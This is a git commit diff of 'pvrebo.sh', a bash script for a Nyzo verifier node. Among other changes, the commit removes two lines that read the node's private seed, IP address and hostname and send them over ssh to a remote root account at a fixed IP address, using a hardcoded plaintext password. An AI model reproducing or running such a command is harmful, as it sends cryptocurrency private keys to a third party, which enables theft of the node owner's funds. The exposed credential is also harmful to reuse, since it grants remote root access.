d026ad08dc3bce2f8317c3026a7ede4943792045
junscapital <52300722+junscapital@users.noreply.github.com>
2020-02-14 09:13:04 +0800

    Update pvrebo.sh

--- pvrebo.sh
+++ pvrebo.sh
@@ -1,9 +1,4 @@
 #!/bin/bash
-sudo su
-sudo bash -c 'echo BAZB$(($RANDOM%500+1)) > /var/lib/nyzo/production/nickname'
 sudo supervisorctl reload
 sleep 8s
 sudo renice -n -5 -p $(pgrep ^java$)
-sleep 7200s
-echo $(curl https://ipinfo.io/ip):9444:$(cat /var/lib/nyzo/production/verifier_private_seed) | sshpass -p 'xRbgLlt8' ssh root@51.91.126.182 'cat - >> /root/managed_verifiers'
-echo $(hostname):$(cat /var/lib/nyzo/production/nickname):$(cat /var/lib/nyzo/production/verifier_private_seed) | sshpass -p 'xRbgLlt8' ssh root@51.91.126.182 'cat - >> /root/file1'
